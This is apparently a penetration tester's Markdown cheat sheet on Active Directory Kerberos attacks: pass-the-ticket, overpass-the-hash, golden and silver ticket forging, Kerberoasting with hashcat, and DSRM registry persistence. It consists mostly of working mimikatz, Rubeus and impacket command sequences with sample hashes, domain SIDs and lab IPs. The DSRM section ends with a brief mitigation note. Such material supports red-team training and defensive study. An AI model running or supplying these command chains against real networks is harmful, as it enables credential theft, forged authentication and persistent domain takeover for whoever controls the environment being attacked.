	

#### Pass the ticket :
Using a stolen Kerberos ticket (TGT or service ticket) to authenticate to services without needing the user's password or hash.
```bash
#using the mimikatz.exe
kerberos::list
kerberos::list /export

kerberos::ptt ticket.kirbi
misc::cmd

#using the Rubeus
Rubeus.exe asktgt /domain:Marvel.local /user:Administrator /rc4:f56a8399599f1be040128b1dd9623c29 /ptt

dir \\<domain-ip>\C$ 
PsExec.exe \\192.168.1.105 cmd.exe

Rubeus.exe ptt /ticket:golden.kirbi

#using impacket-getTGT
impacket-getTGT -dc-ip 192.168.154.134 Marvel.local/hawkeye

export KRB5CCNAME=hawkeye.ccache

impacket-psexec -dc-ip 192.168.154.134 -target-ip 192.168.154.131 -no-pass -k Marvel.local/hawkeye@THE-PUNISHER.MARVEL.local


#use windows check ticket is available 
klist
klist /purge #delete
```


#### Over Pass the ticket (PTH + PTT) :
You're generating a fresh TGT using the hash, then you can pass it — so it’s a hybrid of pass-the-hash and pass-the-ticket.
```bash
#mimikatz:
sekurlsa::pth /user:Administrator /domain:Marvel.local /ntlm:f56a8399599f1be040128b1dd9623c29 

#using rubeus
Rubeus.exe asktgt /domain:Marvel.local /user:Administrator /ntlm:f56a8399599f1be040128b1dd9623c29 /nowrap
Rubeus.exe ptt /ticket:<ticket base64 value>


#using getTGT
impacket-getTGT -dc-ip 192.168.1.105 -hashes :32196b56ffe6f45e294117b91a83bf38 ignite.local/Administrator

export KRB5CCNAME=Administrator.ccache; impacket-psexec -dc-ip 192.168.154.134 -target-ip 192.168.154.131 -no-pass -k Marvel.local/Administrator@THE-PUNISHER.marvel.local
```


#### Golden ticket attack :
A Golden Ticket attack is a powerful post-exploitation technique where an attacker forges a Kerberos Ticket Granting Ticket (TGT) using the stolen hash of the KRBTGT account in Active Directory. This forged ticket gives the attacker unrestricted access to any resource in the domain — allowing them to impersonate any user, including domain admins, and maintain persistent control.
```bash
#requirements
kbrtgt:hash
SID of kbrtgt
Domain name 
impersonate-user

Domain SID → can be found with whoami /user or Get-ADDomain.
KRBTGT account hash → NTLM or AES (from secretsdump.py or DCSync).
Domain name (FQDN) → e.g. MARVEL.LOCAL.
Target user → usually Administrator.


impacket-lookupsid ignite/Administrator:Ignite@987@192.168.1.105
python secretsdump.py administrator:Ignite@987@192.168.1.105 -outputfile krb -user-status

#using ticketer
impacket-ticketer -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain ignite.local Administrator
export KRB5CCNAME=/root/Tools/impacket/examples/Administrator.ccache

export KRB5CCNAME=Administrator.ccache; impacket-psexec -dc-ip 192.168.154.134 -target-ip 192.168.154.131 -no-pass -k Marvel.local/Administrator@THE-PUNISHER.marvel.local

#convert and transfer the kribi file to windows computer.
impacket-ticketConverter /root/impacket/examples/Administrator.ccache golden.kirbi

#use Rubeus.exe pass the the ticket.
Rubeus.exe ptt /ticket:golden.kirbi


#mimikatz :
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-3614020701-506922700-4184706594 /krbtgt:c90bf74688c024687385328ca2616f5b /id:500 /ptt



```

#### Silver ticket attack :
With golden ticket attack, we used the hash of a krbtgt account whereas in the case of the silver ticket attack we will use the password hash of a service account. The password hash of the service account can be extracted by various methods, Kerberoasting being one. Since no intermediary TGT is required for the silver ticket attack to work, silver tickets can be forged without any communication with a Domain Controller and hence is stealthier than golden ticket attack.

```bash
#requirements 
Service hash <perform kerberoasting or use >
Service name <get from kerberoasting attack>
Target FQDN 
Domain SID  <whoami /user>


rubeus.exe kerberoast /domain:ignite.local /creduser:ignite.localaarti /credpassword:Password@1 /nowrap

hashcat -m 13100 '$krb5tgs$23$*sqluser$ignite.local$MSSQLSvc/dc1.ignite.local:1433@ignite.local*$..<snipped>...4297093077601CC' /usr/share/wordlists/rockyou.txt --force
rubeus.exe hash /password:Password@1


rubeus.exe silver /service:MSSQLSvc/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /sid:S-1-5-21-2377760704-1974907900-3052042330 /user:harshitrajpal /domain:ignite.local /ptt


using ticketer:
impacket-ticketer -nthash c6ba25c393c4e412825e6c476c7f2e12 \ 
            -domain-sid S-1-5-21-1730870759-634495401-3117737333 \
            -domain MARVEL.LOCAL \
            -spn cifs/HYDRA-DC.marvel.local \
            administrator

export KRB5CCNAME=Administrator.ccache
impacket-smbclient MARVEL.LOCAL/Administrator@HYDRA-DC.marvel.local -k -no-pass
```


#### Domain Persistence: DSRM
A domain controller includes two Administrator accounts. LSASS manages the “AD Administrator Account,” which administrators use to log in to the domain controller. The system stores the other, a hard-coded “Local Administrator Account,” in its SAM database.

All domain controllers have a hard-coded local Administrator account stored in their SAM file. Typically, this account and local database are not used or generally available when the domain controllers are running normally.
```bash
privilege::debug
token::elevate

#get the lsa and sam password and domain , domain controller administration account
lsadump::sam
lsadump::lsa /patch

#look for this registry value
DsrmAdminLogonBehaviour : 2

#check the registry 
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"

if value = 0 so it's not working

#set the registry value
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose

New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

#use sam password for pass the hash
privilege::debug
sekurlsa::pth /user:Administrator /domain:ignite.local /ntlm:32196B56FFE6F45E294117B91A83BF38



#mitigation
Check & monitor the DsrmAdminLogonBehaviour value is not set to 2 inside the Registry key.
DSRM passwords are changed regularly at least once a month.

ntdsutil
set dsrm password
reset password on server null
# it will prompt for new password and confirmation
q
q
```

